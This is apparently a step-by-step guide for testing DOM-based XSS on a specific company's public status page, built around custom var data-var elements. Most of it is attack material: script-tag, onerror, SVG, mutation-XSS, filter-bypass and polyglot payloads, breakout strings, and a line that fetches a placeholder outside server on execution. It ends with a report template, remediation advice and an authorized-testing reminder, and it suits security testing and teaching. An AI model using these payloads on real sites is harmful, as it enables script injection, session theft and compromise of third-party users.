# XSS Testing: Custom `<var data-var>` Elements

## Target Information
- **Site**: Usercentrics GmbH Status Page
- **Vulnerability Type**: Potential DOM-based XSS via custom data attributes
- **Pattern Found**: `<var data-var='date'>23</var>` and `<var data-var='time'>10:16</var>`

---

## Step 1: Inspect Client-Side JavaScript

### 1.1 Download and Extract Resources ✓

```bash
# Download main page
curl -s https://usercentricsgmbh.statuspage.io/ -o statuspage.html

# Extract JavaScript URLs
grep -oP '(src|href)="[^"]*\.js"' statuspage.html | grep -oP '"[^"]*"' | tr -d '"'

# Download key JS files
curl -s "https://dka575ofm4ao0.cloudfront.net/assets/status_manifest-[hash].js" -o status_manifest.js
curl -s "https://dka575ofm4ao0.cloudfront.net/assets/status_common-[hash].js" -o status_common.js
```

### 1.2 Search for data-var Processing

```bash
# Search for data-var attribute handling
grep -rn "data-var\|innerHTML\|insertAdjacentHTML\|outerHTML" *.js

# Look for querySelector/querySelectorAll with data-var
grep -rn "querySelector.*data-var\|getElementsByAttribute" *.js

# Check for element.dataset usage
grep -rn "\.dataset\|getAttribute.*data-var" *.js
```

### 1.3 Browser Developer Tools Investigation

**Open DevTools (F12) and:**

1. **Search source code:**
   ```javascript
   // In Sources tab, search for:
   "data-var"
   "[data-var"
   "getAttribute('data-var'"
   ```

2. **Monitor DOM changes:**
   ```javascript
   // In Console, observe the var elements:
   document.querySelectorAll('[data-var]')
   
   // Watch for modifications:
   const observer = new MutationObserver(mutations => {
       mutations.forEach(m => console.log(m));
   });
   observer.observe(document.body, {
       childList: true,
       subtree: true,
       characterData: true
   });
   ```

3. **Check event listeners:**
   ```javascript
   // Right-click on a <var> element → Inspect
   // Go to Event Listeners tab
   // Look for: DOMContentLoaded, load, custom events
   ```

---

## Step 2: Check for Injection Points

### 2.1 Identify User-Controlled Inputs

Look for places where you can control data that might end up in these `data-var` elements:

```bash
# Check URL parameters
https://statuspage.io/?date=PAYLOAD
https://statuspage.io/?time=PAYLOAD
https://statuspage.io/#date=PAYLOAD

# Check cookies
document.cookie = "date=PAYLOAD; path=/"

# Check localStorage/sessionStorage
localStorage.setItem('date', 'PAYLOAD')
```

### 2.2 Analyze the Data Flow

**In Browser Console:**

```javascript
// 1. Find all var elements
const varElements = document.querySelectorAll('[data-var]');
console.log('Total var elements:', varElements.length);

// 2. Log their attributes
varElements.forEach(el => {
    console.log({
        tag: el.tagName,
        dataVar: el.getAttribute('data-var'),
        content: el.innerHTML,
        textContent: el.textContent
    });
});

// 3. Try to modify one manually
const testVar = varElements[0];
console.log('Before:', testVar.innerHTML);
testVar.innerHTML = '<img src=x onerror=alert(1)>';
console.log('After:', testVar.innerHTML);
```

### 2.3 Check API Endpoints

```bash
# Look for API calls that might return dates/times
curl -s https://usercentricsgmbh.statuspage.io/history.atom

# Check for JSON endpoints
curl -s https://usercentricsgmbh.statuspage.io/api/v2/incidents.json

# Intercept with Burp Suite or browser DevTools Network tab
```

---

## Step 3: Test XSS Payloads

### 3.1 Basic Payloads

Test these payloads in any input that might reach the `data-var` elements:

```html
<!-- Basic XSS -->
<script>alert(1)</script>

<!-- Image onerror -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg/onload=alert(1)>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- JavaScript URI -->
<a href="javascript:alert(1)">Click</a>
```

### 3.2 Context-Specific Payloads

Since these are in HTML content with `<var>` tags:

```html
<!-- Break out of var tag -->
</var><script>alert(1)</script><var data-var="date">

<!-- Attribute injection -->
</var><img src=x onerror=alert(1)><var data-var="date">

<!-- DOM clobbering -->
<var id="date" name="date"><script>alert(1)</script></var>
```

### 3.3 Test in Browser Console

```javascript
// Direct DOM manipulation test
const testEl = document.querySelector('[data-var="date"]');

// Try innerHTML injection
testEl.innerHTML = '<img src=x onerror=alert(1)>';

// Try textContent (should be safe)
testEl.textContent = '<script>alert(1)</script>';

// Try appendChild
const malicious = document.createElement('img');
malicious.src = 'x';
malicious.onerror = function() { alert('XSS!'); };
testEl.appendChild(malicious);
```

### 3.4 Test via URL/Query Parameters

```bash
# If the page processes URL parameters
https://statuspage.io/?date=<script>alert(1)</script>
https://statuspage.io/?date="><img src=x onerror=alert(1)>

# Fragment identifier
https://statuspage.io/#<script>alert(1)</script>

# Using Burp Suite, intercept and modify:
# - POST data
# - Headers
# - WebSocket messages
```

---

## Step 4: Review Templating Mechanism

### 4.1 Identify the Framework

Look for signs of common frameworks:

```bash
# Search for framework signatures
grep -i "angular\|react\|vue\|handlebars\|mustache\|ejs" statuspage.html

# Check script tags
grep -oP '<script[^>]*src="[^"]*"' statuspage.html

# Look for templating syntax
grep -P '\{\{.*\}\}|\${.*}|<%.*%>' statuspage.html
```

### 4.2 Check Template Processing

**In DevTools Console:**

```javascript
// Check for Angular
window.angular

// Check for React
window.React

// Check for Vue
window.Vue

// Check for jQuery (often used for DOM manipulation)
window.jQuery || window.$

// Look for custom templating
document.querySelectorAll('script[type="text/template"]')
```

### 4.3 Analyze the Pattern

The `data-var` pattern suggests client-side templating. Look for:

```javascript
// Functions that process data-var
function processDataVar() {
    const elements = document.querySelectorAll('[data-var]');
    elements.forEach(el => {
        const varType = el.getAttribute('data-var');
        // VULNERABLE if using innerHTML without sanitization:
        el.innerHTML = getDataForVar(varType);
        
        // SAFE if using textContent:
        el.textContent = getDataForVar(varType);
    });
}
```

---

## Step 5: Advanced Testing Techniques

### 5.1 Mutation XSS (mXSS)

Test payloads that exploit browser parsing differences:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)></style></svg>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### 5.2 Filter Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Null bytes -->
<img src=x onerror="alert(1)%00">

<!-- Unicode -->
<img src=x onerror="aler\u0074(1)">
```

### 5.3 Polyglot Payloads

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

### 5.4 Time-Based Testing

```javascript
// Test if JavaScript execution is possible
<img src=x onerror="console.time('xss');alert(1);console.timeEnd('xss')">

// Or use fetch to external server
<img src=x onerror="fetch('https://your-server.com/xss?poc=1')">
```

---

## Step 6: Reporting Template

```markdown
### XSS Vulnerability: Unsafe data-var Processing

**Severity**: High

**Description**:
The application uses custom `<var data-var="X">` HTML elements that are 
processed client-side, potentially via innerHTML or similar unsafe DOM 
manipulation methods.

**Location**:
- URL: https://usercentricsgmbh.statuspage.io/
- Element: `<var data-var='date'>`
- JavaScript file: status_manifest.js (line XXX)

**Proof of Concept**:
1. Navigate to: https://statuspage.io/
2. Open Developer Console
3. Execute: `document.querySelector('[data-var="date"]').innerHTML = '<img src=x onerror=alert(document.domain)>'`
4. Observe: Alert box displays current domain

**Impact**:
- Session hijacking via document.cookie theft
- Credential theft via keylogging
- Phishing via DOM manipulation
- Complete site defacement

**Remediation**:
1. Use `textContent` instead of `innerHTML` for dynamic data
2. Implement Content Security Policy (CSP)
3. Sanitize all user input with DOMPurify or similar
4. Use framework-native templating with auto-escaping

**References**:
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- DOM-based XSS: https://owasp.org/www-community/attacks/DOM_Based_XSS
```

---

## Tools to Use

1. **Burp Suite** - Intercept and modify requests
2. **Browser DevTools** - Inspect DOM, debug JavaScript
3. **XSS Hunter** - Detect blind XSS
4. **DOM Invader** (Burp extension) - Find DOM XSS
5. **Retire.js** - Check for vulnerable JavaScript libraries
6. **Wappalyzer** - Identify technologies used

---

## Quick Reference Commands

```bash
# Download page
curl -s [URL] -o page.html

# Extract JS
grep -oP 'src="[^"]*\.js"' page.html | cut -d'"' -f2

# Search for vulnerabilities
grep -rn "innerHTML\|outerHTML\|insertAdjacentHTML\|document.write" *.js

# Find data attributes
grep -rn "data-\|getAttribute\|dataset" *.js

# Test in console
document.querySelectorAll('[data-var]')
```

---

## Notes

- Always test on authorized targets only
- Document all findings with screenshots
- Never exploit beyond proof of concept
- Report responsibly to security teams
